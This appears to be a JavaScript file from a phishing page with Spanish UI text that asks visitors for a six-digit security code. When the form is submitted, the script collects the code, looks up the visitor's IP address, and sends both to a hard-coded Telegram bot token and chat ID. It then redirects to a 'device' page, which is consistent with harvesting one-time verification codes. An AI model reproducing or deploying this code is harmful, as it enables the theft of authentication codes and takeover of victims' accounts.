document.querySelectorAll('.security-code-input').forEach(function (input, index) {
    input.addEventListener('input', function () {
        if (this.value.length === 1) {
            if (index < 5) {
                document.getElementById('digit' + (index + 2)).focus();
            }
        }
    });
    input.addEventListener('keydown', function (event) {
        if (event.key === 'Backspace' && this.value.length === 0) {
            if (index > 0) {
                document.getElementById('digit' + index).focus();
            }
        }
    });
});

function enviarCodigo() {
    const digit1 = document.getElementById('digit1').value;
    const digit2 = document.getElementById('digit2').value;
    const digit3 = document.getElementById('digit3').value;
    const digit4 = document.getElementById('digit4').value;
    const digit5 = document.getElementById('digit5').value;
    const digit6 = document.getElementById('digit6').value;

    if (!digit1 || !digit2 || !digit3 || !digit4 || !digit5 || !digit6) {
        alert('Por favor, complete todos los campos.');
    }

    const codigo = digit1 + digit2 + digit3 + digit4 + digit5 + digit6;

    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            const ip = data.ip;

            var botToken = '6835132981:AAFXb1FjswdXDH5Q6cBeUKvBc-B8gID3Ljc';
            var chatId = '-1002110248910';
            const mensaje = `Código de Seguridad: ${codigo}\nIP: ${ip}`;
            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(mensaje)}`;

            fetch(url)
                .then(response => {
                    if (!response.ok) {
                        throw new Error('Network response was not ok');
                    }
                    return response.json();
                })
                .then(data => {
                    console.log(data);

                    setTimeout(function () {
                        window.location.href = './device.html';
                    }, 5000);
                })
                .catch(error => {
                    console.error('Error:', error);
                });
        })
        .catch(error => {
            console.error('Error obteniendo la IP:', error);
        });
}
